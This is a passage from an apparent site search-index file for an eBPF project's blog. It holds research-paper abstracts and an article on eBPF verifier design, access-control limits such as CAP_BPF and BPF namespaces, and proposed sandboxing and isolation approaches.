in throughput and latency compared to Knative, while substantially reducing CPU usage, and obviates the need for 'cold-start'.</p> <p>https://dl.acm.org/doi/10.1145/3544216.3544259</p>"},{"location":"blogs/ebpf-papers/#bpftime-userspace-ebpf-runtime-for-uprobe-syscall-and-kernel-user-interactions","title":"bpftime: userspace eBPF Runtime for Uprobe, Syscall and Kernel-User Interactions","text":"<p>In kernel-centric operations, the uprobe component of eBPF frequently encounters performance bottlenecks, largely attributed to the overheads borne by context switches. Transitioning eBPF operations to user space bypasses these hindrances, thereby optimizing performance. This also enhances configurability and obviates the necessity for root access or privileges for kernel eBPF, subsequently minimizing the kernel attack surface. This paper introduces bpftime, a novel user-space eBPF runtime, which leverages binary rewriting to implement uprobe and syscall hook capabilities. Through bpftime, userspace uprobes achieve a 10x speed enhancement compared to their kernel counterparts without requiring dual context switches. Additionally, this runtime facilitates the programmatic hooking of syscalls within a process, both safely and efficiently. Bpftime can be seamlessly attached to any running process, limiting the need for either a restart or manual recompilation. Our implementation also extends to interprocess eBPF Maps within shared memory, catering to summary aggregation or control plane communication requirements. Compatibility with existing eBPF toolchains such as clang and libbpf is maintained, not only simplifying the development of user-space eBPF without necessitating any modifications but also supporting CO-RE through BTF. Through bpftime, we not only enhance uprobe performance but also extend the versatility and user-friendliness of eBPF runtime in user space, paving the way for more efficient and secure kernel operations.</p> <p>https://arxiv.org/abs/2311.07923#</p>"},{"location":"blogs/ebpf-papers/#kgent-kernel-extensions-large-language-model-agent","title":"Kgent: Kernel Extensions Large Language Model Agent","text":"<p>The ability to modify and extend an operating system is an important feature for improving a system's security, reliability, and performance. The extended Berkeley Packet Filters (eBPF) ecosystem has emerged as the standard mechanism for extending the Linux kernel and has recently been ported to Windows. eBPF programs inject new logic into the kernel that the system will execute before or after existing logic. While the eBPF ecosystem provides a flexible mechanism for kernel extension, it is difficult for developers to write eBPF programs today. An eBPF developer must have deep knowledge of the internals of the operating system to determine where to place logic and cope with programming limitations on the control flow and data accesses of their eBPF program enforced by the eBPF verifier. This paper presents KEN, an alternative framework that alleviates the difficulty of writing an eBPF program by allowing Kernel Extensions to be written in Natural language. KEN uses recent advances in large language models (LLMs) to synthesize an eBPF program given a user's English language prompt. To ensure that LLM's output is semantically equivalent to the user's prompt, KEN employs a combination of LLM-empowered program comprehension, symbolic execution, and a series of feedback loops. KEN's key novelty is the combination of these techniques. In particular, the system uses symbolic execution in a novel structure that allows it to combine the results of program synthesis and program comprehension and build on the recent success that LLMs have shown for each of these tasks individually. To evaluate KEN, we developed a new corpus of natural language prompts for eBPF programs. We show that KEN produces correct eBPF programs on 80% which is an improvement of a factor of 2.67 compared to an LLM-empowered program synthesis baseline.</p> <p>eBPF'24: https://dl.acm.org/doi/10.1145/3672197.3673434 and arxiv https://arxiv.org/abs/2312.05531</p>"},{"location":"blogs/ebpf-papers/#programmable-system-call-security-with-ebpf","title":"Programmable System Call Security with eBPF","text":"<p>System call filtering is a widely used security mechanism for protecting a shared OS kernel against untrusted user applications. However, existing system call filtering techniques either are too expensive due to the context switch overhead imposed by userspace agents, or lack sufficient programmability to express advanced policies. Seccomp, Linux's system call filtering module, is widely used by modern container technologies, mobile apps, and system management services. Despite the adoption of the classic BPF language (cBPF), security policies in Seccomp are mostly limited to static allow lists, primarily because cBPF does not support stateful policies. Consequently, many essential security features cannot be expressed precisely and/or require kernel modifications. In this paper, we present a programmable system call filtering mechanism, which enables more advanced security policies to be expressed by leveraging the extended BPF language (eBPF). More specifically, we create a new Seccomp eBPF program type, exposing, modifying or creating new eBPF helper functions to safely manage filter state, access kernel and user state, and utilize synchronization primitives. Importantly, our system integrates with existing kernel privilege and capability mechanisms, enabling unprivileged users to install advanced filters safely. Our evaluation shows that our eBPF-based filtering can enhance existing policies (e.g., reducing the attack surface of early execution phase by up to 55.4% for temporal specialization), mitigate real-world vulnerabilities, and accelerate filters.</p> <p>https://arxiv.org/abs/2302.10366</p>"},{"location":"blogs/ebpf-papers/#cross-container-attacks-the-bewildered-ebpf-on-clouds","title":"Cross Container Attacks: The Bewildered eBPF on Clouds","text":"<p>The extended Berkeley Packet Filter (eBPF) provides powerful and flexible kernel interfaces to extend the kernel functions for user space programs via running bytecode directly in the kernel space. It has been widely used by cloud services to enhance container security, network management, and system observability. However, we discover that the offensive eBPF that have been extensively discussed in Linux hosts can bring new attack surfaces to containers. With eBPF tracing features, attackers can break the container's isolation and attack the host, e.g., steal sensitive data, DoS, and even escape the container. In this paper, we study the eBPF-based cross container attacks and reveal their security impacts in real world services. With eBPF attacks, we successfully compromise five online Jupyter/Interactive Shell services and the Cloud Shell of Google Cloud Platform. Furthermore, we find that the Kubernetes services offered by three leading cloud vendors can be exploited to launch cross-node attacks after the attackers escape the container via eBPF. Specifically, in Alibaba's Kubernetes services, attackers can compromise the whole cluster by abusing their over-privileged cloud metrics or management Pods. Unfortunately, the eBPF attacks on containers are seldom known and can hardly be discovered by existing intrusion detection systems. Also, the existing eBPF permission model cannot confine the eBPF and ensure secure usage in shared-kernel container environments. To this end, we propose a new eBPF permission model to counter the eBPF attacks in containers.</p> <p>https://www.usenix.org/conference/usenixsecurity23/presentation/he</p>"},{"location":"blogs/ebpf-papers/#comparing-security-in-ebpf-and-webassembly","title":"Comparing Security in eBPF and WebAssembly","text":"<p>This paper examines the security of eBPF and WebAssembly (Wasm), two technologies that have gained widespread adoption in recent years, despite being designed for very different use cases and environments. While eBPF is a technology primarily used within operating system kernels such as Linux, Wasm is a binary instruction format designed for a stack-based virtual machine with use cases extending beyond the web. Recognizing the growth and expanding ambitions of eBPF, Wasm may provide instructive insights, given its design around securely executing arbitrary untrusted programs in complex and hostile environments such as web browsers and clouds. We analyze the security goals, community evolution, memory models, and execution models of both technologies, and conduct a comparative security assessment, exploring memory safety, control flow integrity, API access, and side-channels. Our results show that eBPF has a history of focusing on performance first and security second, while Wasm puts more emphasis on security at the cost of some runtime overheads. Considering language-based restrictions for eBPF and a security model for API access are fruitful directions for future work.</p> <p>https://dl.acm.org/doi/abs/10.1145/3609021.3609306</p> <p>More about can be found in the first workshop: https://conferences.sigcomm.org/sigcomm/2023/workshop-ebpf.html</p>"},{"location":"blogs/ebpf-papers/#a-flow-based-ids-using-machine-learning-in-ebpf","title":"A flow-based IDS using Machine Learning in eBPF","text":"<p>eBPF is a new technology which allows dynamically loading pieces of code into the Linux kernel. It can greatly speed up networking since it enables the kernel to process certain packets without the involvement of a userspace program. So far eBPF has been used for simple packet filtering applications such as firewalls or Denial of Service protection. We show that it is possible to develop a flow based network intrusion detection system based on machine learning entirely in eBPF. Our solution uses a decision tree and decides for each packet whether it is malicious or not, considering the entire previous context of the network flow. We achieve a performance increase of over 20% compared to the same solution implemented as a userspace program.</p> <p>https://arxiv.org/abs/2102.09980</p>"},{"location":"blogs/ebpf-papers/#femto-containers-lightweight-virtualization-and-fault-isolation-for-small-software-functions-on-low-power-iot-microcontrollers","title":"Femto-containers: lightweight virtualization and fault isolation for small software functions on low-power IoT microcontrollers","text":"<p>Low-power operating system runtimes used on IoT microcontrollers typically provide rudimentary APIs, basic connectivity and, sometimes, a (secure) firmware update mechanism. In contrast, on less constrained hardware, networked software has entered the age of serverless, microservices and agility. With a view to bridge this gap, in the paper we design Femto-Containers, a new middleware runtime which can be embedded on heterogeneous low-power IoT devices. Femto-Containers enable the secure deployment, execution and isolation of small virtual software functions on low-power IoT devices, over the network. We implement Femto-Containers, and provide integration in RIOT, a popular open source IoT operating system. We then evaluate the performance of our implementation, which was formally verified for fault-isolation, guaranteeing that RIOT is shielded from logic loaded and executed in a Femto-Container. Our experiments on various popular micro-controller architectures (Arm Cortex-M, ESP32 and RISC-V) show that Femto-Containers offer an attractive trade-off in terms of memory footprint overhead, energy consumption, and security.</p> <p>https://dl.acm.org/doi/abs/10.1145/3528535.3565242</p> <p>Share on  Share on </p>"},{"location":"blogs/ebpf-security/","title":"The Secure Path Forward for eBPF runtime: Challenges and Innovations","text":"<p>Yusheng Zheng</p> <p>Extended Berkeley Packet Filter (eBPF) represents a significant evolution in the way we interact with and extend the capabilities of modern operating systems. As a powerful technology that enables the Linux kernel to run sandboxed programs in response to events, eBPF has become a cornerstone for system observability, networking, and security features.</p> <p>However, as with any system that interfaces closely with the kernel, the security of eBPF itself is paramount. In this blog, we delve into the often-overlooked aspect of eBPF security, exploring how the mechanisms intended to safeguard eBPF can themselves be fortified. We'll dissect the role of the eBPF verifier, scrutinize the current access control model, and investigate potential improvements from ongoing research. Moreover, we'll navigate through the complexities of securing eBPF, addressing open questions and the challenges they pose to system architects and developers alike.</p>"},{"location":"blogs/ebpf-security/#table-of-contents","title":"Table of Contents","text":"<ul> <li>The Secure Path Forward for eBPF runtime: Challenges and Innovations</li> <li>Table of Contents</li> <li>How eBPF Ensures Security with Verifier<ul> <li>What the eBPF Verifier Is and What It Does</li> <li>How the eBPF Verifier Works</li> <li>Challenges</li> <li>Other works to improve verifier</li> </ul> </li> <li>Limitations in eBPF Access Control<ul> <li>CAP_BPF</li> <li>bpf namespace</li> <li>Unprivileged eBPF</li> <li>Trusted Unprivileged BPF</li> </ul> </li> <li>Other possible solutions<ul> <li>MOAT: Towards Safe BPF Kernel Extension (Isolation)</li> <li>Unleashing Unprivileged eBPF Potential with Dynamic Sandboxing</li> <li>Kernel extension verification is untenable</li> <li>Wasm-bpf: WebAssembly eBPF library, toolchain and runtime</li> <li><code>bpftime</code>: Userspace eBPF runtime for uprobe \\&amp; syscall hook \\&amp; plugin</li> </ul> </li> <li>Conclusion</li> </ul>"},{"location":"blogs/ebpf-security/#how-ebpf-ensures-security-with-verifier","title":"How eBPF Ensures Security with Verifier","text":"<p>The security framework of eBPF is largely predicated on the robustness of its verifier. This component acts as the gatekeeper, ensuring that only safe and compliant programs are allowed to run within the kernel space.</p>"},{"location":"blogs/ebpf-security/#what-the-ebpf-verifier-is-and-what-it-does","title":"What the eBPF Verifier Is and What It Does","text":"<p>At its core, the eBPF verifier is a static code analyzer. Its primary function is to vet the BPF program instructions before they are executed. It scrutinizes a copy of the program within the kernel, operating with the following objectives:</p> <ul> <li><code>Ensuring Program Termination</code></li> </ul> <p>The verifier uses depth-first search (DFS) algorithms to traverse the program's control flow graph, which it ensures is a Directed Acyclic Graph (DAG). This is crucial for guaranteeing that the program cannot enter into an infinite loop, thereby ensuring its termination. It meticulously checks for any unbounded loops and malformed or out-of-bounds jumps that could disrupt the normal operation of the kernel or lead to a system hang.</p> <ul> <li><code>Ensuring Memory Safety</code></li> </ul> <p>Memory safety is paramount in kernel operations. The verifier checks for potential out-of-bounds memory accesses that could lead to data corruption or security breaches. It also safeguards against use-after-free bugs and object leaks, which are common vulnerabilities that can be exploited. In addition to these, it takes into account hardware vulnerabilities like Spectre, enforcing mitigations to prevent such side-channel attacks.</p> <ul> <li><code>Ensuring Type Safety</code></li> </ul> <p>Type safety is another critical aspect that the verifier ensures. By preventing type confusion bugs, it helps maintain the integrity of data within the kernel. The eBPF verifier utilizes BPF Type Format (BTF), which allows it to accurately understand and check the kernel's complex data structures, ensuring that the program's operations on these structures are valid and safe.</p> <ul> <li><code>Preventing Hardware Exceptions</code></li> </ul> <p>Hardware exceptions, such as division by zero, can cause abrupt program terminations and kernel panics. To prevent this, the verifier includes checks for divisions by unknown scalars, ensuring that instructions are rewritten or handled in a manner consistent with aarch64 specifications, which dictate safe handling of such exceptions.</p> <p>Through these mechanisms, the eBPF verifier plays a critical role in maintaining the security and stability of the kernel, making it an indispensable component of the eBPF infrastructure. It not only reinforces the system's defenses but also upholds the integrity of operations that eBPF programs intend to perform, making it a quintessential part of the eBPF ecosystem.</p>"},{"location":"blogs/ebpf-security/#how-the-ebpf-verifier-works","title":"How the eBPF Verifier Works","text":"<p>The eBPF verifier is essentially a sophisticated simulation engine that exhaustively tests every possible execution path of a given eBPF program. This simulation is not a mere theoretical exercise but a stringent enforcement of security and safety policies in kernel operations.</p> <ul> <li>Follows control flow graph   The verifier begins its analysis by constructing and following the control flow graph (CFG) of the eBPF program. It carefully computes the set of possible states for each instruction, considering the BPF register set and stack. Safety checks are then performed depending on the current instruction context.</li> </ul> <p>One of the critical aspects of this process is register spill/fill tracking for the program's private BPF stack. This ensures that operations involving the stack do not lead to overflows or underflows, which could corrupt data or provide an attack vector.</p> <ul> <li> <p>Back-edges in control flow graph   To effectively manage loops within the eBPF program, the verifier identifies back-edges in the CFG. Bounded loops are handled by simulating all iterations up to a predefined limit, thus guaranteeing that loops will not lead to indefinite execution.</p> </li> <li> <p>Dealing with potentially large number of states   The verifier must manage the complexity that comes with the large number of potential states in a program's execution paths. It employs path pruning logic to compare the current state with prior states, assessing whether the current path is \"equivalent\" to prior paths and has a safe exit. This reduces the overall number of states that need to be considered.</p> </li> <li> <p>Function-by-function verification for state reduction   To streamline the verification process, the verifier conducts a function-by-function analysis. This modular approach allows for a reduction in the number of states that need to be analyzed at any given time, thereby improving the efficiency of the verification.</p> </li> <li> <p>On-demand scalar precision (back-)tracking for state reduction   The verifier uses on-demand scalar precision tracking to reduce the state space further. By back-tracking scalar values when necessary, the verifier can more accurately predict the program's behavior, optimizing its analysis process.</p> </li> <li> <p>Terminates with rejection upon surpassing \u201ccomplexity\u201d threshold   To maintain practical performance, the verifier has a \"complexity\" threshold. If a program's analysis surpasses this threshold, the verifier will terminate the process and reject the program. This ensures that only programs that are within the manageable complexity are allowed to execute, balancing security with system performance.</p> </li> </ul>"},{"location":"blogs/ebpf-security/#challenges","title":"Challenges","text":"<p>Despite its thoroughness, the eBPF verifier faces significant challenges:</p> <ul> <li> <p>Attractive target for exploitation when exposed to non-root users   As the verifier becomes more complex, it becomes an increasingly attractive target for exploitation. The programmability of eBPF, while powerful, also means that if an attacker were to bypass the verifier and gain execution within the OS kernel, the consequences could be severe.</p> </li> <li> <p>Reasoning about verifier correctness is non-trivial   Ensuring the verifier's correctness, especially concerning Spectre mitigations, is not a straightforward task. While there is some formal verification in place, it is only partial. Areas such as the Just-In-Time (JIT) compilers and abstract interpretation models are particularly challenging.</p> </li> <li> <p>Occasions where valid programs get rejected   There is sometimes a disconnect between the optimizations performed by LLVM (the compiler infrastructure used to prepare eBPF programs) and the verifier's ability to understand these optimizations, leading to valid programs being erroneously rejected.</p> </li> <li> <p>\"Stable ABI\" for BPF program types   A \"stable ABI\" is vital so that BPF programs running in production do not break upon an OS kernel upgrade. However, maintaining this stability while also evolving the verifier and the BPF ecosystem presents its own set of challenges.</p> </li> <li> <p>Performance vs. security considerations   Finally, the eternal trade-off between performance and security is pronounced in the verification of complex eBPF programs. While the verifier must be efficient to be practical, it also must not compromise on security, as the performance of the programs it is verifying is crucial for modern computing systems.</p> </li> </ul> <p>The eBPF verifier stands as a testament to the ingenuity in modern computing security, navigating the treacherous waters between maximum programmability and maintaining a fortress-like defense at the kernel level.</p>"},{"location":"blogs/ebpf-security/#other-works-to-improve-verifier","title":"Other works to improve verifier","text":"<ul> <li>Specification and verification in the field: Applying formal methods to BPF just-in-time compilers in the Linux kernel: https://www.usenix.org/conference/osdi20/presentation/nelson</li> <li>\"Sound, Precise, and Fast Abstract Interpretation with Tristate Numbers\u201d, Vishwanathan et al. https://arxiv.org/abs/2105.05398</li> <li>\u201cEliminating bugs in BPF JITs using automated formal verification\u201d, Nelson et al. https://arxiv.org/abs/2105.05398</li> <li>\u201cA proof-carrying approach to building correct and flexible BPF verifiers\u201d, Nelson et al. https://linuxplumbersconf.org/event/7/contributions/685/</li> <li>\u201cAutomatically optimizing BPF programs using program synthesis\u201d, Xu et al. https://linuxplumbersconf.org/event/11/contributions/944/</li> <li>\u201cSimple and Precise Static Analysis of Untrusted Linux Kernel Extensions\u201d, Gershuni et al. https://linuxplumbersconf.org/event/11/contributions/951/</li> <li>\u201cAn Analysis of Speculative Type Confusion Vulnerabilities in the Wild\u201d, Kirzner et al. https://www.usenix.org/conference/usenixsecurity21/presentation/kirzner</li> </ul> <p>Together, these works signify a robust and multi-faceted research initiative aimed at bolstering the foundations of eBPF verification, ensuring that it remains a secure and performant tool for extending the capabilities of the Linux kernel.</p> <p>Other reference for you to learn more about eBPF verifier:</p> <ul> <li>BPF and Spectre: Mitigating transient execution attacks: https://popl22.sigplan.org/details/prisc-2022-papers/11/BPF-and-Spectre-Mitigating-transient-execution-attacks</li> </ul>"},{"location":"blogs/ebpf-security/#limitations-in-ebpf-access-control","title":"Limitations in eBPF Access Control","text":"<p>After leading Linux distributions, such as Ubuntu and SUSE, have disallowed unprivileged usage of eBPF Socket Filter and CGroup programs, the current eBPF access control model only supports a single permission level. This level necessitates the CAP_SYS_ADMIN capability for all features. However, CAP_SYS_ADMIN carries inherent risks, particularly to containers, due to its extensive privileges.</p> <p>Addressing this, Linux 5.6 introduces a more granular permission system by breaking down eBPF capabilities. Instead of relying solely on CAP_SYS_ADMIN, a new capability, CAP_BPF, is introduced for invoking the bpf syscall. Additionally, installing specific types of eBPF programs demands further capabilities, such as CAP_PERFMON for performance monitoring or CAP_NET_ADMIN for network administration tasks. This structure aims to mitigate certain types of attacks\u2014like altering process memory or eBPF maps\u2014that still require CAP_SYS_ADMIN.</p> <p>Nevertheless, these segregated capabilities are not bulletproof against all eBPF-based attacks, such as Denial of Service (DoS) and information theft. Attackers may exploit these to craft eBPF-based malware specifically targeting containers. The emergence of eBPF in cloud-native applications exacerbates this threat, as users could inadvertently deploy containers that contain untrusted eBPF programs.</p> <p>Compounding the issue, the risks associated with eBPF in containerized environments are not entirely understood. Some container services might unintentionally grant eBPF permissions, for reasons such as enabling filesystem mounting functionality. The existing permission model is inadequate in preventing misuse of these potentially harmful eBPF features within containers.</p>"},{"location":"blogs/ebpf-security/#cap_bpf","title":"CAP_BPF","text":"<p>Traditionally, almost all BPF actions required CAP_SYS_ADMIN privileges, which also grant broad system access. Over time, there has been a push to separate BPF permissions from these root privileges. As a result, capabilities like CAP_PERFMON and CAP_BPF were introduced to allow more granular control over BPF operations, such as reading kernel memory and loading tracing or networking programs, without needing full system admin rights.</p> <p>However, CAP_BPF's scope is also ambiguous, leading to a perception problem. Unlike CAP_SYS_MODULE, which is well-defined and used for loading kernel modules, CAP_BPF lacks namespace constraints, meaning it can access all kernel memory rather than being container-specific. This broad access is problematic because verifier bugs in BPF programs can crash the kernel, considered a security vulnerability, leading to an excessive number of CVEs (Common Vulnerabilities and Exposures) being filed, even for bugs that are already fixed. This response to verifier bugs creates undue alarm and urgency to patch older kernel versions that may not have been updated.</p> <p>Additionally, some security startups have been criticized for exploiting the fears around BPF's capabilities to market their products, paradoxically using BPF itself to safeguard against the issues they highlight. This has led to a contradictory narrative where BPF is both demonized and promoted as a solution.</p>"},{"location":"blogs/ebpf-security/#bpf-namespace","title":"bpf namespace","text":"<p>The current security model requires the CAP_SYS_ADMIN capability for iterating BPF object IDs and converting these IDs to file descriptors (FDs). This is to prevent non-privileged users from accessing BPF programs owned by others, but it also restricts them from inspecting their own BPF objects, posing a challenge in container environments.</p> <p>Users can run BPF programs with CAP_BPF and other specific capabilities, yet they lack a generic method to inspect these programs, as tools like bpftool need CAP_SYS_ADMIN. The existing workaround without CAP_SYS_ADMIN is deemed inconvenient, involving SCM_RIGHTS and Unix domain sockets for sharing BPF object FDs between processes.</p> <p>To address these limitations, Yafang Shao proposes introducing a BPF namespace. This would allow users to create BPF maps, programs, and links within a specific namespace, isolating these objects from users in different namespaces. However, objects within a BPF namespace would still be visible to the parent namespace, enabling system administrators to maintain oversight.</p> <p>The BPF namespace is conceptually similar to the PID namespace and is intended to be intuitive. The initial implementation focuses on BPF maps, programs, and links, with plans to extend this to other BPF objects like BTF and bpffs in the future. This could potentially enable container users to trace only the processes within their container without accessing data from other containers, enhancing security and usability in containerized environments.</p> <p>reference:</p> <ul> <li>BPF and security: https://lwn.net/Articles/946389/</li> <li>Cross Container Attacks: The Bewildered eBPF on Clouds https://www.usenix.org/system/files/usenixsecurity23-he.pdf</li> <li>bpf: Introduce BPF namespace: https://lwn.net/Articles/927354/</li> <li>ebpf-running-in-linux-namespaces: https://stackoverflow.com/questions/48815633/ebpf-running-in-linux-namespaces</li> </ul>"},{"location":"blogs/ebpf-security/#unprivileged-ebpf","title":"Unprivileged eBPF","text":"<p>The concept of unprivileged eBPF refers to the ability for non-root users to load eBPF programs into the kernel. This feature is controversial due to security implications and, as such, is currently turned off by default across all major Linux distributions. The concern stems from hardware vulnerabilities like Spectre to kernel bugs and exploits, which can be exploited by malicious eBPF programs to leak sensitive data or attack the system.</p> <p>To combat this, mitigations have been put in place for various versions of these vulnerabilities, like v1, v2, and v4. However, these mitigations come at a cost, often significantly reducing the flexibility and performance of eBPF programs. This trade-off makes the feature unattractive and impractical for many users and use cases.</p>"},{"location":"blogs/ebpf-security/#trusted-unprivileged-bpf","title":"Trusted Unprivileged BPF","text":"<p>In light of these challenges, a middle ground known as \"trusted unprivileged BPF\" is being explored. This approach would involve an allowlist system, where specific eBPF programs that have been thoroughly vetted and deemed trustworthy could be loaded by unprivileged users. This vetting process would ensure that only secure, production-ready programs bypass the privilege requirement, maintaining a balance between security and functionality. It's a step toward enabling more widespread use of eBPF without compromising the system's integrity.</p> <ul> <li> <p>Permissive LSM hooks: Rejected upstream given LSMs enforce further restrictions</p> <p>New Linux Security Module (LSM) hooks specifically for the BPF subsystem, with the intent of offering more granular control over BPF maps and BTF data objects. These are fundamental to the operation of modern BPF applications.</p> <p>The primary addition includes two LSM hooks: bpf_map_create_security and bpf_btf_load_security, which provide the ability to override the default permission checks that rely on capabilities like CAP_BPF and CAP_NET_ADMIN. This new mechanism allows for finer control, enabling policies to enforce restrictions or bypass checks for trusted applications, shifting the decision-making to custom LSM policy implementations.</p> <p>This approach allows for a safer default by not requiring applications to have BPF-related capabilities, which are typically required to interact with the kernel's BPF subsystem. Instead, applications can run without such privileges, with only vetted and trusted cases being granted permission to operate as if they had elevated capabilities.</p> </li> <li> <p>BPF token concept to delegate subset of BPF via token fd from trusted privileged daemon</p> <p>the BPF token, a new mechanism allowing privileged daemons to delegate a subset of BPF functionality to trusted unprivileged applications. This concept enables containerized BPF applications to operate safely within user namespaces\u2014a feature previously unattainable due to security restrictions with CAP_BPF capabilities. The BPF token is created and managed via kernel APIs, and it can be pinned within the BPF filesystem for controlled access. The latest version of the patch ensures that a BPF token is confined to its creation instance in the BPF filesystem to prevent misuse. This addition to the BPF subsystem facilitates more secure and flexible unprivileged BPF operations.</p> </li> <li> <p>BPF signing as gatekeeper: application vs BPF program (no one-size-fits-all)</p> <p>Song Liu has proposed a patch for unprivileged access to BPF functionality through a new device, <code>/dev/bpf</code>. This device controls access via two new ioctl commands that allow users with write permissions to the device to invoke <code>sys_bpf()</code>. These commands toggle the ability of the current task to call <code>sys_bpf()</code>, with the permission state being stored in the <code>task_struct</code>. This permission is also inheritable by new threads created by the task. A new helper function, <code>bpf_capable()</code>, is introduced to check if a task has obtained permission through <code>/dev/bpf</code>. The patch includes updates to documentation and header files.</p> </li> <li> <p>RPC to privileged BPF daemon: Limitations depending on use cases/environment</p> <p>The RPC approach (eg. bpfd) is similar to the BPF token concept, but it uses a privileged daemon to manage the BPF programs. This daemon is responsible for loading and unloading BPF programs, as well as managing the BPF maps. The daemon is also responsible for verifying the BPF programs before loading them. This approach is more flexible than the BPF token concept, as it allows for more fine-grained control over the BPF programs. However, it is also more complex, bring more maintenance challenges and possibilities for single points of failure.</p> </li> </ul> <p>reference</p> <ul> <li>Permissive LSM hooks: https://lore.kernel.org/bpf/20230412043300.360803-1-andrii@kernel.org/</li> <li>BPF token concept: https://lore.kernel.org/bpf/20230629051832.897119-1-andrii@kernel.org/</li> <li>BPF signing using fsverity and LSM gatekeeper: https://www.youtube.com/watch?v=9p4qviq60z8</li> <li>Sign the BPF bytecode: https://lpc.events/event/16/contributions/1357/attachments/1045/1999/BPF%20Signatures.pdf</li> <li>bpfd: https://bpfd.dev/</li> </ul>"},{"location":"blogs/ebpf-security/#other-possible-solutions","title":"Other possible solutions","text":"<p>Here are also some research or discussions about how to improve the security of eBPF. Existing works can be roughly divided into three categories: virtualization, Software Fault Isolation (SFI), and formal methods. Use a sandbox like WebAssembly to deploy eBPF programs or run eBPF programs in userspace is also a possible solution.</p>"},{"location":"blogs/ebpf-security/#moat-towards-safe-bpf-kernel-extension-isolation","title":"MOAT: Towards Safe BPF Kernel Extension (Isolation)","text":"<p>The Linux kernel makes considerable use of Berkeley Packet Filter (BPF) to allow user-written BPF applications to execute in the kernel space. BPF employs a verifier to statically check the security of user-supplied BPF code. Recent attacks show that BPF programs can evade security checks and gain unauthorized access to kernel memory, indicating that the verification process is not flawless. In this paper, we present MOAT, a system that isolates potentially malicious BPF programs using Intel Memory Protection Keys (MPK). Enforcing BPF program isolation with MPK is not straightforward; MOAT is carefully designed to alleviate technical obstacles, such as limited hardware keys and supporting a wide variety of kernel BPF helper functions. We have implemented MOAT in a prototype kernel module, and our evaluation shows that MOAT delivers low-cost isolation of BPF programs under various real-world usage scenarios, such as the isolation of a packet-forwarding BPF program for the memcached database with an average throughput loss of 6%.</p> <p>https://arxiv.org/abs/2301.13421</p> <p>If we must resort to hardware protection mechanisms, is language safety or verification still necessary to protect the kernel and extensions from one another?</p>"},{"location":"blogs/ebpf-security/#unleashing-unprivileged-ebpf-potential-with-dynamic-sandboxing","title":"Unleashing Unprivileged eBPF Potential with Dynamic Sandboxing","text":"<p>For safety reasons, unprivileged users today have only limited ways to customize the kernel through the extended Berkeley Packet Filter (eBPF). This is unfortunate, especially since the eBPF framework itself has seen an increase in scope over the years. We propose SandBPF, a software-based kernel isolation technique that dynamically sandboxes eBPF programs to allow unprivileged users to safely extend the kernel, unleashing eBPF's full potential. Our early proof-of-concept shows that SandBPF can effectively prevent exploits missed by eBPF's native safety mechanism (i.e., static verification) while incurring 0%-10% overhead on web server benchmarks.</p> <p>https://arxiv.org/abs/2308.01983</p> <p>It may be conflict with the original design of eBPF, since it's not designed to use sandbox to ensure safety. Why not using webassembly in kernel if you want SFI?</p>"},{"location":"blogs/ebpf-security/#kernel-extension-verification-is-untenable","title":"Kernel extension verification is untenable","text":"<p>The emergence of verified eBPF bytecode is ushering in a new era of safe kernel extensions. In this paper, we argue that eBPF\u2019s verifier\u2014the source of its safety guarantees\u2014has become a liability. In addition to the well-known bugs and vulnerabilities stemming from the complexity and ad hoc nature of the in-kernel verifier, we highlight a concerning trend in which escape hatches to unsafe kernel functions (in the form of helper functions) are being introduced to bypass verifier-imposed limitations on expressiveness, unfortunately also bypassing its safety guarantees. We propose safe kernel extension frameworks using a balance of not just static but also lightweight runtime techniques. We describe a design centered around kernel extensions in safe Rust that will eliminate the need of the in-kernel verifier, improve expressiveness, allow for reduced escape hatches, and ultimately improve the safety of kernel extensions</p> <p>https://sigops.org/s/conferences/hotos/2023/papers/jia.pdf</p> <p>It may limits the kernel to load only eBPF programs that are signed by trusted third parties, as the kernel itself can no longer independently verify them. The rust toolchains also has vulnerabilities.</p>"},{"location":"blogs/ebpf-security/#wasm-bpf-webassembly-ebpf-library-toolchain-and-runtime","title":"Wasm-bpf: WebAssembly eBPF library, toolchain and runtime","text":"<p>Wasm-bpf is a WebAssembly eBPF library, toolchain and runtime allows the construction of eBPF programs into Wasm with little to no changes to the code, and run them cross platforms with Wasm sandbox.</p> <p>It provides a configurable environment with limited eBPF WASI behavior, enhancing security and control. This allows for fine-grained permissions, restricting access to kernel resources and providing a more secure environment. For instance, eBPF programs can be restricted to specific types of useage, such as network monitoring, it can also configure what kind of eBPF programs can be loaded in kernel, what kind of attach event it can access without the need for modify kernel eBPF permission models.</p> <ul> <li>Kubecon talk: https://sched.co/1R2uf</li> <li>Repo: https://github.com/eunomia-bpf/wasm-bpf</li> </ul> <p>It will require additional effort to port the application to WebAssembly. Additionally, Wasm interface of kernel eBPF also need more effort of maintain, as the BPF daemon does.</p>"},{"location":"blogs/ebpf-security/#bpftime-userspace-ebpf-runtime-for-uprobe-syscall-hook-plugin","title":"<code>bpftime</code>: Userspace eBPF runtime for uprobe &amp; syscall hook &amp; plugin","text":"<p>An userspace eBPF runtime that allows existing eBPF applications to operate in unprivileged userspace using the same libraries and toolchains. It offers Uprobe and Syscall tracepoints for eBPF, with significant performance improvements over kernel uprobe and without requiring manual code instrumentation or process restarts. The runtime facilitates interprocess eBPF maps in userspace shared memory, and is also compatible with kernel eBPF maps, allowing for seamless operation with the kernel's eBPF infrastructure. It includes a high-performance LLVM JIT for various architectures, alongside a lightweight JIT for x86 and an interpreter.</p> <ul> <li>https://arxiv.org/abs/2311.07923</li> <li>Linux Plumbers: https://lpc.events/event/17/contributions/1639/</li> <li>Repo: https://github.com/eunomia-bpf/bpftime</li> </ul> <p>It may only limited to centain eBPF program types and usecases, not a general approach for kernel eBPF.</p>"},{"location":"blogs/ebpf-security/#conclusion","title":"Conclusion","text":"<p>As we have traversed the multifaceted domain of eBPF security, it's clear that while eBPF\u2019s verifier provides a robust first line of defense, there are inherent limitations within the current access control model that require attention. We have considered potential solutions from the realms of virtualization, software fault isolation, and formal methods to WebAssembly or userspace eBPF runtime, each offering unique approaches to fortify eBPF against vulnerabilities.</p> <p>However, as with any complex system, new questions and challenges continue to surface. The gaps identified between the theoretical security models and their practical implementation invite continued research and experimentation. The future of eBPF security is not only promising but also demands a collective effort to ensure the technology can be adopted with confidence in its capacity to safeguard systems.</p> <p>We are github.com/eunomia-bpf, build open source projects to make eBPF easier to use, and exploring new technologies, toolchains and runtimes related to eBPF. For those interested in eBPF technology, check out our tutorial code repository at https://github.com/eunomia-bpf/bpf-developer-tutorial and our tutorials at https://eunomia.dev/tutorials/ for practical understanding and practice. The original text of this article is from https://eunomia.dev/blogs/ebpf-security, welcome to star and follow us.</p> <p>Share on  Share on </p>"},{"location":"blogs/ebpf-wasm/","title":"When 